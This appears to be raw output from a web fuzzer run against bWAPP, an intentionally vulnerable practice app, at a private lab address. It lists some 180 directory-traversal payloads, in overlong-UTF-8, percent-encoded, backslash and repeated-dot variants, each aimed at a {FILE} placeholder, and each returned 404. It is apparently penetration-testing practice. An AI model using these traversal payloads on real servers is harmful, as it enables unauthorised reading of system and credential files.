700,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
701,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
703,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
702,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
704,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%2f{FILE}
705,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
707,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
706,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
709,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
708,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
711,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
712,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%5c{FILE}
713,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%5c..%c0%5c{FILE}
710,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE}
716,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
715,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
717,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
714,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%5c..%c0%5c..%c0%5c{FILE}
721,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
720,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e\{FILE}
719,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
718,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE}
723,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
726,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
729,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
732,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
733,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
731,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
730,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
725,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
724,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
728,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%5c{FILE}
722,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
727,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE}
737,404,9L,39W,http://10.0.2.4/bWAPP/////%2e%2e%2f%2e%2e%2f{FILE}
734,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
735,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE}
736,404,9L,39W,http://10.0.2.4/bWAPP/////%2e%2e%2f{FILE}
741,404,9L,39W,http://10.0.2.4/bWAPP/////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
740,404,9L,39W,http://10.0.2.4/bWAPP/////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
742,404,9L,39W,http://10.0.2.4/bWAPP/////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
739,404,9L,39W,http://10.0.2.4/bWAPP/////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
738,404,9L,39W,http://10.0.2.4/bWAPP/////%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
746,404,9L,39W,http://10.0.2.4/bWAPP//\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
747,404,9L,39W,http://10.0.2.4/bWAPP//\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
750,404,9L,39W,http://10.0.2.4/bWAPP//\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
751,404,9L,39W,http://10.0.2.4/bWAPP//\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
743,404,9L,39W,http://10.0.2.4/bWAPP/////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
744,404,9L,39W,http://10.0.2.4/bWAPP//\\\%2e%2e%5c{FILE}
748,404,9L,39W,http://10.0.2.4/bWAPP//\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
749,404,9L,39W,http://10.0.2.4/bWAPP//\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
745,404,9L,39W,http://10.0.2.4/bWAPP//\\\%2e%2e%5c%2e%2e%5c{FILE}
754,404,9L,39W,http://10.0.2.4/bWAPP//..//..//..//{FILE}
752,404,9L,39W,http://10.0.2.4/bWAPP//..//{FILE}
753,404,9L,39W,http://10.0.2.4/bWAPP//..//..//{FILE}
755,404,9L,39W,http://10.0.2.4/bWAPP//..//..//..//..//{FILE}
759,404,9L,39W,http://10.0.2.4/bWAPP//..//..//..//..//..//..//..//..//{FILE}
758,404,9L,39W,http://10.0.2.4/bWAPP//..//..//..//..//..//..//..//{FILE}
756,404,9L,39W,http://10.0.2.4/bWAPP//..//..//..//..//..//{FILE}
757,404,9L,39W,http://10.0.2.4/bWAPP//..//..//..//..//..//..//{FILE}
760,404,9L,39W,http://10.0.2.4/bWAPP//..///{FILE}
762,404,9L,39W,http://10.0.2.4/bWAPP//..///..///..///{FILE}
761,404,9L,39W,http://10.0.2.4/bWAPP//..///..///{FILE}
763,404,9L,39W,http://10.0.2.4/bWAPP//..///..///..///..///{FILE}
765,404,9L,39W,http://10.0.2.4/bWAPP//..///..///..///..///..///..///{FILE}
764,404,9L,39W,http://10.0.2.4/bWAPP//..///..///..///..///..///{FILE}
768,404,9L,39W,http://10.0.2.4/bWAPP//..\\{FILE}
767,404,9L,39W,http://10.0.2.4/bWAPP//..///..///..///..///..///..///..///..///{FILE}
769,404,9L,39W,http://10.0.2.4/bWAPP//..\\..\\{FILE}
766,404,9L,39W,http://10.0.2.4/bWAPP//..///..///..///..///..///..///..///{FILE}
770,404,9L,39W,http://10.0.2.4/bWAPP//..\\..\\..\\{FILE}
771,404,9L,39W,http://10.0.2.4/bWAPP//..\\..\\..\\..\\{FILE}
775,404,9L,39W,http://10.0.2.4/bWAPP//..\\..\\..\\..\\..\\..\\..\\..\\{FILE}
772,404,9L,39W,http://10.0.2.4/bWAPP//..\\..\\..\\..\\..\\{FILE}
782,404,9L,39W,http://10.0.2.4/bWAPP//..\\\..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
780,404,9L,39W,http://10.0.2.4/bWAPP//..\\\..\\\..\\\..\\\..\\\{FILE}
774,404,9L,39W,http://10.0.2.4/bWAPP//..\\..\\..\\..\\..\\..\\..\\{FILE}
777,404,9L,39W,http://10.0.2.4/bWAPP//..\\\..\\\{FILE}
778,404,9L,39W,http://10.0.2.4/bWAPP//..\\\..\\\..\\\{FILE}
776,404,9L,39W,http://10.0.2.4/bWAPP//..\\\{FILE}
773,404,9L,39W,http://10.0.2.4/bWAPP//..\\..\\..\\..\\..\\..\\{FILE}
779,404,9L,39W,http://10.0.2.4/bWAPP//..\\\..\\\..\\\..\\\{FILE}
783,404,9L,39W,http://10.0.2.4/bWAPP//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
781,404,9L,39W,http://10.0.2.4/bWAPP//..\\\..\\\..\\\..\\\..\\\..\\\{FILE}
784,404,9L,39W,http://10.0.2.4/bWAPP//./\/./{FILE}
786,404,9L,39W,http://10.0.2.4/bWAPP//./\/././\/././\/./{FILE}
785,404,9L,39W,http://10.0.2.4/bWAPP//./\/././\/./{FILE}
787,404,9L,39W,http://10.0.2.4/bWAPP//./\/././\/././\/././\/./{FILE}
791,404,9L,39W,http://10.0.2.4/bWAPP//./\/././\/././\/././\/././\/././\/././\/././\/./{FILE}
788,404,9L,39W,http://10.0.2.4/bWAPP//./\/././\/././\/././\/././\/./{FILE}
789,404,9L,39W,http://10.0.2.4/bWAPP//./\/././\/././\/././\/././\/././\/./{FILE}
790,404,9L,39W,http://10.0.2.4/bWAPP//./\/././\/././\/././\/././\/././\/././\/./{FILE}
793,404,9L,39W,http://10.0.2.4/bWAPP//.\/\.\.\/\.\{FILE}
792,404,9L,39W,http://10.0.2.4/bWAPP//.\/\.\{FILE}
795,404,9L,39W,http://10.0.2.4/bWAPP//.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
794,404,9L,39W,http://10.0.2.4/bWAPP//.\/\.\.\/\.\.\/\.\{FILE}
796,404,9L,39W,http://10.0.2.4/bWAPP//.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
797,404,9L,39W,http://10.0.2.4/bWAPP//.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
798,404,9L,39W,http://10.0.2.4/bWAPP//.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
799,404,9L,39W,http://10.0.2.4/bWAPP//.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE}
800,404,9L,39W,http://10.0.2.4/bWAPP//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../{FILE}
801,404,9L,39W,http://10.0.2.4/bWAPP//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../{FILE}
817,404,9L,39W,http://10.0.2.4/bWAPP//./.././../{FILE}
816,404,9L,39W,http://10.0.2.4/bWAPP//./../{FILE}
824,404,9L,39W,http://10.0.2.4/bWAPP//.\..\{FILE}
825,404,9L,39W,http://10.0.2.4/bWAPP//.\..\.\..\{FILE}
828,404,9L,39W,http://10.0.2.4/bWAPP//.\..\.\..\.\..\.\..\.\..\{FILE}
827,404,9L,39W,http://10.0.2.4/bWAPP//.\..\.\..\.\..\.\..\{FILE}
829,404,9L,39W,http://10.0.2.4/bWAPP//.\..\.\..\.\..\.\..\.\..\.\..\{FILE}
830,404,9L,39W,http://10.0.2.4/bWAPP//.\..\.\..\.\..\.\..\.\..\.\..\.\..\{FILE}
826,404,9L,39W,http://10.0.2.4/bWAPP//.\..\.\..\.\..\{FILE}
831,404,9L,39W,http://10.0.2.4/bWAPP//.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\{FILE}
832,404,9L,39W,http://10.0.2.4/bWAPP//.//..//{FILE}
833,404,9L,39W,http://10.0.2.4/bWAPP//.//..//.//..//{FILE}
834,404,9L,39W,http://10.0.2.4/bWAPP//.//..//.//..//.//..//{FILE}
836,404,9L,39W,http://10.0.2.4/bWAPP//.//..//.//..//.//..//.//..//.//..//{FILE}
835,404,9L,39W,http://10.0.2.4/bWAPP//.//..//.//..//.//..//.//..//{FILE}
837,404,9L,39W,http://10.0.2.4/bWAPP//.//..//.//..//.//..//.//..//.//..//.//..//{FILE}
838,404,9L,39W,http://10.0.2.4/bWAPP//.//..//.//..//.//..//.//..//.//..//.//..//.//..//{FILE}
848,404,9L,39W,http://10.0.2.4/bWAPP//../{FILE}
847,404,9L,39W,http://10.0.2.4/bWAPP//.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
839,404,9L,39W,http://10.0.2.4/bWAPP//.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//{FILE}
846,404,9L,39W,http://10.0.2.4/bWAPP//.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
845,404,9L,39W,http://10.0.2.4/bWAPP//.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
841,404,9L,39W,http://10.0.2.4/bWAPP//.\\..\\.\\..\\{FILE}
840,404,9L,39W,http://10.0.2.4/bWAPP//.\\..\\{FILE}
843,404,9L,39W,http://10.0.2.4/bWAPP//.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
844,404,9L,39W,http://10.0.2.4/bWAPP//.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}
851,404,9L,39W,http://10.0.2.4/bWAPP//../..//../..//{FILE}
842,404,9L,39W,http://10.0.2.4/bWAPP//.\\..\\.\\..\\.\\..\\{FILE}
850,404,9L,39W,http://10.0.2.4/bWAPP//../..//../{FILE}
849,404,9L,39W,http://10.0.2.4/bWAPP//../..//{FILE}
853,404,9L,39W,http://10.0.2.4/bWAPP//../..//../..//../..//{FILE}
855,404,9L,39W,http://10.0.2.4/bWAPP//../..//../..//../..//../..//{FILE}
858,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\{FILE}
859,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\..\\{FILE}
856,404,9L,39W,http://10.0.2.4/bWAPP//..\{FILE}
857,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\{FILE}
862,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\..\\..\..\\..\{FILE}
863,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\..\\..\..\\..\..\\{FILE}
860,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\..\\..\{FILE}
861,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\..\\..\..\\{FILE}
865,404,9L,39W,http://10.0.2.4/bWAPP//../..///{FILE}
866,404,9L,39W,http://10.0.2.4/bWAPP//../..//..///{FILE}
864,404,9L,39W,http://10.0.2.4/bWAPP//..///{FILE}
868,404,9L,39W,http://10.0.2.4/bWAPP//../..//../..//..///{FILE}
867,404,9L,39W,http://10.0.2.4/bWAPP//../..//../..///{FILE}
870,404,9L,39W,http://10.0.2.4/bWAPP//../..//../..//../..//..///{FILE}
869,404,9L,39W,http://10.0.2.4/bWAPP//../..//../..//../..///{FILE}
872,404,9L,39W,http://10.0.2.4/bWAPP//..\\\{FILE}
871,404,9L,39W,http://10.0.2.4/bWAPP//../..//../..//../..//../..///{FILE}
873,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\\{FILE}
875,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\..\\\{FILE}
874,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\\\{FILE}
876,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\..\\..\\\{FILE}
877,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\..\\..\..\\\{FILE}
878,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\..\\..\..\\..\\\{FILE}
881,404,9L,39W,http://10.0.2.4/bWAPP//\..%2f\..%2f
879,404,9L,39W,http://10.0.2.4/bWAPP//..\..\\..\..\\..\..\\..\..\\\{FILE}
880,404,9L,39W,http://10.0.2.4/bWAPP//\..%2f
882,404,9L,39W,http://10.0.2.4/bWAPP//\..%2f\..%2f\..%2f
885,404,9L,39W,http://10.0.2.4/bWAPP//\..%2f\..%2f\..%2f\..%2f\..%2f\..%2f
884,404,9L,39W,http://10.0.2.4/bWAPP//\..%2f\..%2f\..%2f\..%2f\..%2f
886,404,9L,39W,http://10.0.2.4/bWAPP//\..%2f\..%2f\..%2f\..%2f\..%2f\..%2f\..%2f
883,404,9L,39W,http://10.0.2.4/bWAPP//\..%2f\..%2f\..%2f\..%2f
887,404,9L,39W,http://10.0.2.4/bWAPP//\..%2f\..%2f\..%2f\..%2f\..%2f\..%2f\..%2f\..%2f{FILE}
